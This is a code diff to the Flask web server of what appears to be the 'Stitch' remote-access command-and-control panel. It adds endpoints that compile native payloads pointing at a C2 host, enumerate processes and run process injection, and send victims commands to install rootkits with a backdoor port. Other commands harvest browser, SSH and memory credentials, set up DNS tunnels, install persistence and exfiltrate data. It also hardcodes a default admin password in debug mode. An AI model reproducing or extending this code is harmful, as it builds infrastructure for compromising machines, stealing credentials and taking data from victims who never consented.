@@ -232,7 +232,16 @@ def load_credentials():
     username = os.getenv('STITCH_ADMIN_USER')
     password = os.getenv('STITCH_ADMIN_PASSWORD')
     
-    # Require explicit credentials - no defaults
+    # In debug mode, provide development defaults
+    if os.getenv('STITCH_DEBUG', '').lower() == 'true':
+        if not username:
+            username = 'admin'
+            print("⚠️  DEBUG MODE: Using default username 'admin'")
+        if not password:
+            password = 'SecureTestPassword123!'
+            print("⚠️  DEBUG MODE: Using default password")
+    
+    # Require explicit credentials - no defaults in production
     if not username or not password:
         raise RuntimeError(
             "\n" + "="*75 + "\n"
@@ -243,6 +252,8 @@ def load_credentials():
             "Please set environment variables:\n"
             "  STITCH_ADMIN_USER='your_username'\n"
             "  STITCH_ADMIN_PASSWORD='your_secure_password'\n\n"
+            "Or for development:\n"
+            "  STITCH_DEBUG=true (enables default credentials)\n\n"
             "In Replit: Add these to Secrets tab (🔒 icon)\n"
             "="*75
         )
@@ -287,7 +298,11 @@ def initialize_credentials():
             USERS.update(loaded_creds)
             print("✓ Credentials loaded from environment variables")
         except RuntimeError as e:
-            print(f"ERROR: {str(e)}")
+            # Only print full error once
+            if 'SECURITY ERROR' in str(e):
+                print("\n⚠️  Credentials not configured. Set STITCH_ADMIN_USER and STITCH_ADMIN_PASSWORD or use STITCH_DEBUG=true for development.\n")
+            else:
+                print(f"ERROR: {str(e)}")
             raise
 
 # Initialize credentials when module is imported (WSGI compatibility)
@@ -792,7 +807,7 @@ def export_commands():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/generate-payload', methods=['POST'])
+@app.route('/api/generate-payload', methods=['POST', 'OPTIONS'])
 @login_required
 @limiter.limit("5 per hour")  # Limit payload generation
 def generate_payload():
@@ -800,6 +815,44 @@ def generate_payload():
     try:
         metrics_collector.increment_counter('api_requests')
         data = request.json or {}
+        
+        # Check if native payload requested
+        if data.get('type') == 'native':
+            from native_payload_builder import native_builder
+            
+            config = {
+                'platform': data.get('platform', 'linux'),
+                'c2_host': data.get('bind_host', 'localhost'),
+                'c2_port': data.get('bind_port', 4433)
+            }
+            
+            log_debug(f"Generating native {config['platform']} payload", "INFO", "Payload")
+            
+            # Compile native payload
+            result = native_builder.compile_payload(config)
+            
+            if result['success']:
+                session['payload_path'] = result['path']
+                session['payload_filename'] = f"payload_{config['platform']}"
+                session['payload_type'] = 'native'
+                session['payload_platform'] = config['platform']
+                
+                log_debug(f"Native payload generated: {result['size']} bytes", "INFO", "Payload")
+                
+                return jsonify({
+                    'success': True,
+                    'message': result['message'],
+                    'payload_size': result['size'],
+                    'payload_type': 'native',
+                    'platform': result['platform'],
+                    'filename': os.path.basename(result['path']),
+                    'hash': result['hash'],
+                    'config': config,
+                    'download_url': '/api/download-payload'
+                })
+            else:
+                log_debug(f"Native payload generation failed: {result['error']}", "ERROR", "Payload")
+                return jsonify({'error': result['error']}), 500
         
         # Import the enhanced payload generator
         from web_payload_generator import web_payload_gen
@@ -889,6 +942,471 @@ def configure_payload():
         return jsonify({'status': 'success', 'message': 'Payload configured'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# Development test endpoint (remove in production!)
+# Process Injection API Endpoints
+@app.route('/api/inject/list-processes', methods=['GET'])
+@login_required
+def list_processes():
+    """List all running processes with injection viability scores"""
+    try:
+        from injection_manager import injection_manager
+        
+        processes = injection_manager.enumerate_processes()
+        
+        # Filter based on query parameters
+        show_system = request.args.get('show_system', 'false').lower() == 'true'
+        show_critical = request.args.get('show_critical', 'false').lower() == 'true'
+        only_injectable = request.args.get('only_injectable', 'false').lower() == 'true'
+        
+        filtered = []
+        for proc in processes:
+            if not show_system and proc['username'] in ['SYSTEM', 'root']:
+                continue
+            if not show_critical and proc['is_critical']:
+                continue
+            if only_injectable and not proc['is_injectable']:
+                continue
+            filtered.append(proc)
+        
+        return jsonify({
+            'success': True,
+            'count': len(filtered),
+            'processes': filtered[:100]  # Limit to 100 for performance
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/techniques', methods=['GET'])
+@login_required
+def get_injection_techniques():
+    """Get available injection techniques for current platform"""
+    try:
+        from injection_manager import injection_manager
+        
+        techniques = injection_manager.get_available_techniques()
+        
+        return jsonify({
+            'success': True,
+            'platform': injection_manager.platform,
+            'techniques': techniques
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/execute', methods=['POST'])
+@login_required
+@limiter.limit("10 per hour")
+def execute_injection():
+    """Execute process injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        data = request.json or {}
+        
+        # Validate required fields
+        if 'pid' not in data or 'technique' not in data:
+            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
+        
+        # Execute injection
+        result = injection_manager.execute_injection(data)
+        
+        if result['success']:
+            log_debug(f"Injection successful: PID {data['pid']}, Technique: {data['technique']}", 
+                     "INFO", "Injection")
+            return jsonify(result)
+        else:
+            log_debug(f"Injection failed: {result.get('error')}", "ERROR", "Injection")
+            return jsonify(result), 500
+            
+    except Exception as e:
+        log_debug(f"Injection error: {str(e)}", "ERROR", "Injection")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/status/<injection_id>', methods=['GET'])
+@login_required
+def get_injection_status(injection_id):
+    """Get status of an injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        status = injection_manager.get_injection_status(injection_id)
+        
+        if 'error' in status:
+            return jsonify({'success': False, 'error': status['error']}), 404
+        
+        return jsonify({
+            'success': True,
+            'status': status
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/terminate/<injection_id>', methods=['POST'])
+@login_required
+def terminate_injection(injection_id):
+    """Terminate an active injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        success = injection_manager.terminate_injection(injection_id)
+        
+        if success:
+            return jsonify({'success': True, 'message': 'Injection terminated'})
+        else:
+            return jsonify({'success': False, 'error': 'Injection not found'}), 404
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/history', methods=['GET'])
+@login_required
+def get_injection_history():
+    """Get injection history"""
+    try:
+        from injection_manager import injection_manager
+        
+        history = injection_manager.get_injection_history()
+        
+        return jsonify({
+            'success': True,
+            'count': len(history),
+            'history': history
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/test-native-payload', methods=['POST'])
+@csrf.exempt
+def test_native_payload():
+    """Test endpoint for native payload generation - DEV ONLY"""
+    if not app.debug:
+        return jsonify({'error': 'Not available in production'}), 403
+        
+    try:
+        from native_payload_builder import native_builder
+        
+        data = request.json or {}
+        config = {
+            'platform': data.get('platform', 'linux'),
+            'c2_host': data.get('c2_host', 'localhost'),
+            'c2_port': data.get('c2_port', 4433)
+        }
+        
+        result = native_builder.compile_payload(config)
+        
+        if result['success']:
+            return jsonify({
+                'success': True,
+                'path': str(result['path']),
+                'size': result['size'],
+                'hash': result['hash']
+            })
+        else:
+            return jsonify({'success': False, 'error': result['error']}), 500
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# ============= PHASE 3 INTEGRATION ENDPOINTS =============
+
+@app.route('/api/target/<target_id>/action', methods=['POST'])
+@login_required
+@limiter.limit("20 per minute")
+def execute_target_action(target_id):
+    """Execute Phase 3 advanced actions on target"""
+    try:
+        metrics_collector.increment_counter('phase3_actions')
+        
+        data = request.json
+        action = data.get('action')
+        
+        # Get target connection
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return jsonify({'success': False, 'error': 'Target not connected'}), 404
+            
+        # Build command based on action
+        command = {
+            'id': generate_unique_id(),
+            'timestamp': datetime.utcnow().isoformat(),
+            'target_id': target_id
+        }
+        
+        if action == 'rootkit':
+            log_debug(f"Installing rootkit on {target_id}", "WARNING", "Phase3")
+            command.update({
+                'type': 'INSTALL_ROOTKIT',
+                'params': {
+                    'hide_pids': data.get('hide_pids', []),
+                    'hide_ports': data.get('hide_ports', [4433, 31337]),
+                    'hide_files': data.get('hide_files', ['stitch_*']),
+                    'backdoor_port': data.get('backdoor_port', 31337)
+                }
+            })
+            
+        elif action == 'ghost':
+            log_debug(f"Process ghosting on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'GHOST_PROCESS',
+                'params': {
+                    'payload': data.get('payload', 'self'),
+                    'method': data.get('method', 'memfd'),  # memfd, transaction
+                    'target_process': data.get('target_process')
+                }
+            })
+            
+        elif action == 'harvest':
+            log_debug(f"Harvesting credentials on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'HARVEST_CREDS',
+                'params': {
+                    'targets': data.get('targets', ['browser', 'ssh', 'memory', 'env']),
+                    'exfil_method': data.get('exfil_method', 'direct'),
+                    'process_targets': data.get('process_targets', [])
+                }
+            })
+            
+        elif action == 'dns_tunnel':
+            log_debug(f"Setting up DNS tunnel on {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'SETUP_DNS_TUNNEL',
+                'params': {
+                    'server': data.get('server', '8.8.8.8'),
+                    'domain': data.get('domain', 'data.example.com'),
+                    'mode': data.get('mode', 'backup'),  # primary, backup
+                    'chunk_size': data.get('chunk_size', 32)
+                }
+            })
+            
+        elif action == 'persist_all':
+            log_debug(f"Installing full persistence on {target_id}", "WARNING", "Phase3")
+            command.update({
+                'type': 'PERSIST_FULL',
+                'params': {
+                    'methods': data.get('methods', ['rootkit', 'startup', 'service', 'scheduled']),
+                    'backup_c2': data.get('backup_c2', True),
+                    'hide_artifacts': data.get('hide_artifacts', True)
+                }
+            })
+            
+        elif action == 'exfiltrate':
+            log_debug(f"Exfiltrating data from {target_id}", "INFO", "Phase3")
+            command.update({
+                'type': 'EXFILTRATE',
+                'params': {
+                    'method': data.get('method', 'direct'),
+                    'target': data.get('target'),
+                    'compress': data.get('compress', True),
+                    'encrypt': data.get('encrypt', True),
+                    'chunk_delay': data.get('chunk_delay', 100)
+                }
+            })
+            
+        else:
+            return jsonify({'success': False, 'error': f'Unknown action: {action}'}), 400
+            
+        # Send command to target
+        if send_command_to_target(target_id, command):
+            # Track operation
+            operation_id = command['id']
+            active_operations[operation_id] = {
+                'target_id': target_id,
+                'action': action,
+                'status': 'pending',
+                'started': datetime.utcnow(),
+                'command': command
+            }
+            
+            # Emit WebSocket event
+            socketio.emit('operation_started', {
+                'operation_id': operation_id,
+                'target_id': target_id,
+                'action': action,
+                'timestamp': datetime.utcnow().isoformat()
+            })
+            
+            return jsonify({
+                'success': True,
+                'operation_id': operation_id,
+                'message': f'Action {action} initiated'
+            })
+        else:
+            return jsonify({'success': False, 'error': 'Failed to send command'}), 500
+            
+    except Exception as e:
+        log_debug(f"Phase3 action error: {str(e)}", "ERROR", "Phase3")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/target/<target_id>/info', methods=['GET'])
+@login_required
+def get_target_info(target_id):
+    """Get detailed target information including Phase 3 status"""
+    try:
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return jsonify({'success': False, 'error': 'Target not found'}), 404
+            
+        # Get stored target info
+        target_info = {
+            'id': target_id,
+            'status': 'online' if target_conn else 'offline',
+            'last_beacon': target_conn.get('last_beacon', 'Never'),
+            'ip_address': target_conn.get('ip'),
+            'hostname': target_conn.get('hostname', 'Unknown'),
+            'os': target_conn.get('os', 'Unknown'),
+            'privileges': target_conn.get('privileges', 'user'),
+            'has_rootkit': target_conn.get('has_rootkit', False),
+            'has_persistence': target_conn.get('has_persistence', False),
+            'credentials_found': target_conn.get('credentials_found', 0),
+            'processes': []
+        }
+        
+        # Get process list with injection scores
+        if target_conn.get('processes'):
+            from injection_manager import injection_manager
+            processes = injection_manager.enumerate_processes()
+            
+            # Filter and score
+            for proc in processes[:20]:  # Limit to top 20
+                proc['injection_score'] = injection_manager.calculate_injection_score(proc)
+                target_info['processes'].append({
+                    'pid': proc['pid'],
+                    'name': proc['name'],
+                    'injection_score': proc['injection_score']
+                })
+                
+        return jsonify(target_info)
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/task/<task_id>/status', methods=['GET'])
+@login_required
+def get_task_status(task_id):
+    """Get status of a Phase 3 operation"""
+    try:
+        operation = active_operations.get(task_id)
+        
+        if not operation:
+            return jsonify({'success': False, 'error': 'Operation not found'}), 404
+            
+        # Calculate duration
+        duration = (datetime.utcnow() - operation['started']).total_seconds()
+        
+        return jsonify({
+            'success': True,
+            'task_id': task_id,
+            'status': operation['status'],
+            'action': operation['action'],
+            'target_id': operation['target_id'],
+            'duration': duration,
+            'result': operation.get('result'),
+            'error': operation.get('error')
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/credentials', methods=['GET'])
+@login_required
+def get_harvested_credentials():
+    """Get all harvested credentials"""
+    try:
+        # In production, these would be stored in database
+        credentials = session.get('harvested_credentials', [])
+        
+        return jsonify({
+            'success': True,
+            'count': len(credentials),
+            'credentials': credentials
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# Helper function to send commands to targets
+def send_command_to_target(target_id, command):
+    """Send command to connected target via WebSocket"""
+    try:
+        target_conn = active_connections.get(target_id)
+        if not target_conn:
+            return False
+            
+        # Encrypt command
+        encrypted_command = encrypt_data(json.dumps(command))
+        
+        # Send via WebSocket
+        socketio.emit('command', encrypted_command, room=target_conn.get('sid'))
+        
+        log_debug(f"Command sent to {target_id}: {command['type']}", "INFO", "Command")
+        return True
+        
+    except Exception as e:
+        log_debug(f"Failed to send command: {str(e)}", "ERROR", "Command")
+        return False
+
+# WebSocket handlers for Phase 3 operations
+@socketio.on('operation_result')
+def handle_operation_result(data):
+    """Handle results from Phase 3 operations"""
+    try:
+        operation_id = data.get('operation_id')
+        operation = active_operations.get(operation_id)
+        
+        if not operation:
+            return
+            
+        # Update operation status
+        operation['status'] = data.get('status', 'completed')
+        operation['result'] = data.get('result')
+        operation['error'] = data.get('error')
+        
+        # Special handling for different operations
+        if operation['action'] == 'harvest' and data.get('credentials'):
+            # Store harvested credentials
+            if 'harvested_credentials' not in session:
+                session['harvested_credentials'] = []
+            session['harvested_credentials'].extend(data['credentials'])
+            
+            # Update target info
+            target_id = operation['target_id']
+            if target_id in active_connections:
+                active_connections[target_id]['credentials_found'] = len(data['credentials'])
+                
+            # Broadcast credential update
+            socketio.emit('credentials_harvested', {
+                'target_id': target_id,
+                'count': len(data['credentials']),
+                'credentials': data['credentials']
+            })
+            
+        elif operation['action'] == 'rootkit' and data.get('status') == 'installed':
+            # Mark target as having rootkit
+            target_id = operation['target_id']
+            if target_id in active_connections:
+                active_connections[target_id]['has_rootkit'] = True
+                active_connections[target_id]['has_persistence'] = True
+                
+            socketio.emit('rootkit_installed', {
+                'target_id': target_id
+            })
+            
+        # Emit completion event
+        socketio.emit('operation_completed', {
+            'operation_id': operation_id,
+            'status': operation['status'],
+            'result': operation.get('result')
+        })
+        
+        log_debug(f"Operation {operation_id} completed: {operation['status']}", "INFO", "Phase3")
+        
+    except Exception as e:
+        log_debug(f"Operation result error: {str(e)}", "ERROR", "Phase3")
 
 @app.route('/api/download-payload')
 @login_required
@@ -1893,13 +2411,15 @@ if __name__ == '__main__':
 
     build_tools_status = check_build_tools()
 
-    # Start Stitch server in background
-    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
-    stitch_thread.start()
-    
-    # Start connection monitor
-    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
-    monitor_thread.start()
+    # Start background threads only when running as main
+    if __name__ == '__main__':
+        # Start Stitch server in background
+        stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
+        stitch_thread.start()
+        
+        # Start connection monitor
+        monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
+        monitor_thread.start()
     
     # Configure debug mode - default to False for security
     debug_mode = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
@@ -1939,8 +2459,7 @@ if __name__ == '__main__':
             debug=debug_mode,
             use_reloader=False,
             log_output=True,
-            certfile=ssl_cert,
-            keyfile=ssl_key
+            ssl_context=ssl_context
         )
     else:
         socketio.run(
